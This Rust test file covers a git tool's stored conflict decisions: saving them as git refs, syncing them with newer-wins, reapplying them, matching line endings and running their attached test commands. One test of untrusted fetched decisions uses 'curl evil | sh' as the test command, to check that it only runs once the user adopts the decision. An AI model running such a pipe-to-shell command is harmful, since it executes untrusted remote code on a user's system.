//! Decisions on real repositories: stored in git and read back, sent and fetched, applied when
//! the same conflict comes back, offered as stale when the code around it changed, and their
//! tests run, through the tab as the conflict editor uses them.

use std::path::{Path, PathBuf};

use super::memo::Draft;
use super::record::{Decision, TestRun, key};
use super::*;
use crate::git::InProgress;
use crate::repo::conflict::{Choice, ConflictEditor};

fn git(dir: &Path, args: &[&str]) -> Result<String, String> {
    crate::git::run(Some(dir), args)
}

/// A fresh repository named after `name`, with one commit.
fn repo(name: &str) -> Result<PathBuf, String> {
    let dir = std::env::temp_dir().join(format!("gitcraft-decide-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    for args in [
        &["init", "-q", "-b", "main"][..],
        &["config", "user.name", "t"],
        &["config", "user.email", "t@t"],
        &["config", "commit.gpgSign", "false"],
        &["commit", "-q", "--allow-empty", "-m", "base"],
    ] {
        git(&dir, args)?;
    }
    Ok(dir)
}

const FILE: &str =
    "1\n2\n3\n<<<<<<< HEAD\nnew validation\n=======\nold wire format\n>>>>>>> b\n4\n5\n6\n";

/// An editor on `text` written to `dir/path`.
fn editor(dir: &Path, path: &str, text: &str) -> Result<ConflictEditor, String> {
    std::fs::write(dir.join(path), text).map_err(|e| e.to_string())?;
    ConflictEditor::open(dir, path, Some(InProgress::Merge)).ok_or_else(|| "not opened".into())
}

/// Polls `tab` until `done` holds (or a few seconds pass).
fn wait(tab: &mut RepoTab, ctx: &egui::Context, done: impl Fn(&RepoTab) -> bool) {
    for _ in 0..400 {
        tab.poll(ctx);
        if done(tab) {
            return;
        }
        std::thread::sleep(std::time::Duration::from_millis(25));
    }
}

#[test]
fn decisions_are_stored_in_git_and_read_back() -> Result<(), String> {
    let dir = repo("store")?;
    let k = key("ours\n", "theirs\n");
    let decision = Decision {
        path: "dír ü/a b.rs".into(),
        note: "keep the new validation, keep the old wire format — ünïcode \"quoted\"".into(),
        test: "cargo test wire".into(),
        resolution: "both\n".repeat(5000),
        ours: "ours\n".into(),
        theirs: "theirs\n".into(),
        ..Decision::default()
    };
    store::save(&dir, &k, &decision)?;
    let other = key("x", "y");
    let found = store::load(&dir, &[k.clone(), other.clone(), "../bad".into()]);
    let refs = git(&dir, &["for-each-ref", "--format=%(refname)", store::REFS])?;
    let _ = std::fs::remove_dir_all(&dir);
    let found = found?;
    assert_eq!(found.len(), 1);
    assert_eq!(found.get(&k), Some(&decision));
    assert!(!found.contains_key(&other));
    assert_eq!(refs.trim(), format!("{}{k}", store::REFS));
    assert!(store::save(Path::new("/nonexistent"), "../x", &decision).is_err());
    Ok(())
}

/// They travel only when asked: the newer of two decisions for the same conflict wins both
/// ways, so a decision made here since isn't lost to a fetch, nor a colleague's to a send.
#[test]
fn decisions_travel_and_the_newer_one_wins() -> Result<(), String> {
    let dir = repo("travel")?;
    let remote = dir.with_extension("remote.git");
    let clone = dir.with_extension("clone");
    let _ = std::fs::remove_dir_all(&remote);
    let _ = std::fs::remove_dir_all(&clone);
    let note = |at: &Path, k: &str| -> Result<Option<String>, String> {
        Ok(store::load(at, &[k.to_owned()])?.remove(k).map(|d| d.note))
    };
    let outcome = (|| -> Result<Vec<Option<String>>, String> {
        crate::git::run(None, &["init", "-q", "--bare", &remote.to_string_lossy()])?;
        crate::git::run(None, &["init", "-q", &clone.to_string_lossy()])?;
        for at in [&dir, &clone] {
            git(at, &["remote", "add", "origin", &remote.to_string_lossy()])?;
        }
        let (a, b) = (key("a", "b"), key("c", "d"));
        let made = |n: &str, at: i64| Decision {
            note: n.into(),
            at,
            ..Decision::default()
        };
        // Nothing to send yet: said.
        let empty = store::sync(&dir, "origin", true)?;
        store::save(&dir, &a, &made("first", 10))?;
        store::save(&dir, &b, &made("mine", 10))?;
        store::sync(&dir, "origin", true)?;
        // The clone gets both, then makes a newer one of a, and an older one of b.
        store::sync(&clone, "origin", false)?;
        let got = note(&clone, &a)?;
        store::save(&clone, &a, &made("second", 20))?;
        store::save(&clone, &b, &made("stale", 5))?;
        store::sync(&clone, "origin", true)?;
        // Back here: a is the clone's newer one, b stays mine (and the remote takes it back).
        store::sync(&dir, "origin", true)?;
        store::sync(&clone, "origin", false)?;
        Ok(vec![
            Some(empty),
            got,
            note(&dir, &a)?,
            note(&dir, &b)?,
            note(&clone, &b)?,
        ])
    })();
    for d in [&dir, &remote, &clone] {
        let _ = std::fs::remove_dir_all(d);
    }
    let outcome = outcome?;
    assert!(
        outcome[0]
            .as_deref()
            .is_some_and(|s| s.contains("no conflict decisions to send")),
        "{outcome:?}"
    );
    assert_eq!(outcome[1].as_deref(), Some("first"));
    assert_eq!(outcome[2].as_deref(), Some("second"));
    assert_eq!(outcome[3].as_deref(), Some("mine"));
    assert_eq!(outcome[4].as_deref(), Some("mine"));
    Ok(())
}

// Resolved with a note and saved, the decision is stored; the same conflict opened again is
// resolved the same way at once, its note and test filled in.
// Source grouping retains the established qualified test names.
include!("tests/reuse.rs");

fn pending(decisions: Vec<(String, Decision)>, run_tests: bool) -> Pending {
    Pending {
        path: "f".into(),
        decisions,
        run_tests,
        others_conflicted: 2,
    }
}

/// A test run once the file is saved, after its decision is stored: how it went is said and
/// kept with the decision; a failing one says its last line, and that other files still had
/// conflicts.
#[test]
fn tests_run_after_saving_and_are_remembered() -> Result<(), String> {
    let dir = repo("tests")?;
    let k = key("a\n", "b\n");
    let decision = |test: &str| Decision {
        test: test.into(),
        ours: "a\n".into(),
        theirs: "b\n".into(),
        ..Decision::default()
    };
    // Stored before the test runs: the test sees its own decision.
    let passing = record_and_test(
        &dir,
        pending(
            vec![(
                k.clone(),
                decision(
                    "printf 'ü %s\\n' \"two words\" && test -f .git/HEAD && git for-each-ref \
                     refs/gitcraft/conflict-decisions | grep -q .",
                ),
            )],
            true,
        ),
    );
    let stored_pass = store::load(&dir, std::slice::from_ref(&k))?.remove(&k);
    let failing = record_and_test(
        &dir,
        pending(
            vec![(
                k.clone(),
                decision("echo first; echo 'last words' >&2; exit 3"),
            )],
            true,
        ),
    );
    let stored_fail = store::load(&dir, std::slice::from_ref(&k))?.remove(&k);
    // Not asked to run: kept, not run.
    let not_run = record_and_test(&dir, pending(vec![(k.clone(), decision("exit 1"))], false));
    let _ = std::fs::remove_dir_all(&dir);

    assert!(
        passing.iter().any(|(s, bad)| s.contains("passes") && !bad),
        "{passing:?}"
    );
    let run = stored_pass.and_then(|d| d.last_test).ok_or("no run kept")?;
    assert!(run.passed);
    assert_eq!(run.output, "ü two words");
    assert!(
        failing.iter().any(|(s, bad)| *bad
            && s.contains("fails: last words")
            && s.contains("2 other files still had conflicts")),
        "{failing:?}"
    );
    let run = stored_fail.and_then(|d| d.last_test).ok_or("no run kept")?;
    assert!(!run.passed);
    assert!(run.output.contains("first") && run.output.contains("last words"));
    assert_eq!(not_run, vec![("Kept the decision".to_owned(), false)]);
    Ok(())
}

/// A decision read (fetched from elsewhere, perhaps) brings no note or test of the user's:
/// rejected, nothing is recorded over it; its test runs only once taken as the user's own.
/// Used anyway though stale, it is kept as it was made, brought up to date.
#[test]
fn a_decision_read_is_never_recorded_as_the_users_own() -> Result<(), String> {
    let dir = repo("untrusted")?;
    let mut ed = editor(&dir, "f.rs", FILE)?;
    let _ = std::fs::remove_dir_all(&dir);
    ed.memo.spots = ed.decision_spots();
    let fetched = Decision {
        note: "keep the old wire format".into(),
        test: "curl evil | sh".into(),
        resolution: "old wire format\n".into(),
        ours: "new validation\n".into(),
        theirs: "old wire format\n".into(),
        before: "elsewhere\n".into(),
        by: "someone".into(),
        at: 3,
        last_test: Some(TestRun {
            passed: true,
            at: 3,
            output: String::new(),
        }),
        ..Decision::default()
    };
    ed.take_offers(vec![Some(fetched.clone())]);
    // Stale: not applied; the user picks Ours instead and saves.
    assert_eq!(ed.choices, vec![None]);
    ed.choose(0, Choice::Ours);
    assert!(!ed.has_tests());
    assert_eq!(ed.to_record("me", 9), Ok(Vec::new()));
    // Used anyway: kept as it was made, with the lines around it as they are now.
    ed.use_offer(0);
    let kept = ed.to_record("me", 9)?;
    assert_eq!(kept.len(), 1);
    let d = &kept[0].1;
    assert_eq!(
        (d.by.as_str(), d.at, d.note.as_str()),
        ("someone", 3, fetched.note.as_str())
    );
    assert_eq!(d.before, "1\n2\n3\n");
    assert_eq!(d.last_test, None);
    assert!(!ed.has_tests());
    // Taken as the user's own: now it is theirs, and its test can run.
    ed.take_note(0);
    assert!(ed.has_tests());
    let mine = ed.to_record("me", 9)?;
    assert_eq!(mine[0].1.by, "me");
    assert_eq!(mine[0].1.test, "curl evil | sh");
    Ok(())
}

/// A decision made where the file had LF, used where it has CRLF: its text takes CRLF.
#[test]
fn a_decision_takes_the_files_line_ends() -> Result<(), String> {
    let dir = repo("crlf")?;
    let crlf = FILE.replace('\n', "\r\n");
    let mut ed = editor(&dir, "f.rs", &crlf)?;
    let _ = std::fs::remove_dir_all(&dir);
    ed.memo.spots = ed.decision_spots();
    ed.take_offers(vec![Some(Decision {
        resolution: "merged\nlines\n".into(),
        ours: "new validation\n".into(),
        theirs: "old wire format\n".into(),
        before: "1\n2\n3\n".into(),
        after: "4\n5\n6\n".into(),
        ..Decision::default()
    })]);
    assert_eq!(ed.choices, vec![Some(Choice::Recorded)]);
    assert_eq!(
        ed.result,
        crlf.replace(
            "<<<<<<< HEAD\r\nnew validation\r\n=======\r\nold wire format\r\n>>>>>>> b\r\n",
            "merged\r\nlines\r\n"
        )
    );
    Ok(())
}

/// Notes written before Mergiraf solved some conflicts stay with the conflicts left.
#[test]
fn notes_survive_mergiraf() -> Result<(), String> {
    let dir = repo("mergiraf")?;
    let two = format!("{FILE}<<<<<<< HEAD\nx\n=======\ny\n>>>>>>> b\n");
    let mut ed = editor(&dir, "f.rs", &two)?;
    let _ = std::fs::remove_dir_all(&dir);
    ed.memo.drafts = vec![
        Draft::default(),
        Draft {
            note: "x and y".into(),
            ..Draft::default()
        },
    ];
    ed.memo.run_tests = true;
    // The first solved; the second left.
    let left = two.replacen(
        "<<<<<<< HEAD\nnew validation\n=======\nold wire format\n>>>>>>> b\n",
        "solved\n",
        1,
    );
    assert_eq!(ed.take_solved(left), 1);
    assert_eq!(ed.memo.drafts.len(), 1);
    assert_eq!(ed.memo.drafts[0].note, "x and y");
    assert!(ed.memo.run_tests);
    Ok(())
}

/// What is stored is what was saved: taken as the save starts, not as it ends.
#[test]
fn decisions_are_taken_as_the_save_starts() -> Result<(), String> {
    let dir = repo("pending")?;
    let ctx = egui::Context::default();
    let mut tab = RepoTab::new_deferred(dir.clone(), &ctx);
    let mut ed = editor(&dir, "f.rs", FILE)?;
    ed.choose(0, Choice::Theirs);
    ed.memo.drafts = vec![Draft {
        note: "as saved".into(),
        ..Draft::default()
    }];
    tab.conflict = Some(ed);
    tab.prepare_decisions();
    // Changed (or another file opened) while the save was on its way.
    if let Some(ed) = tab.conflict.as_mut() {
        ed.memo.drafts[0].note = "changed after".into();
        ed.path = "other.rs".into();
    }
    tab.record_decisions("f.rs", &ctx);
    wait(&mut tab, &ctx, |tab| tab.status.is_some());
    let k = key("new validation\n", "old wire format\n");
    let stored = store::load(&dir, std::slice::from_ref(&k))?.remove(&k);
    let _ = std::fs::remove_dir_all(&dir);
    assert_eq!(stored.map(|d| d.note), Some("as saved".to_owned()));
    Ok(())
}

#[test]
fn test_commands_are_one_line() {
    use super::memo::one_line;
    assert_eq!(one_line("cargo test \\\n  wire"), "cargo test    wire");
    assert_eq!(
        one_line("cargo build\ncargo test\n"),
        "cargo build; cargo test"
    );
    assert_eq!(one_line("  x  "), "x");
}

// Edited by hand: the text of each conflict is found again in the result; when it can't be,
// nothing is kept and that is said.
// Source grouping retains the established qualified test names.
include!("tests/presentation.rs");
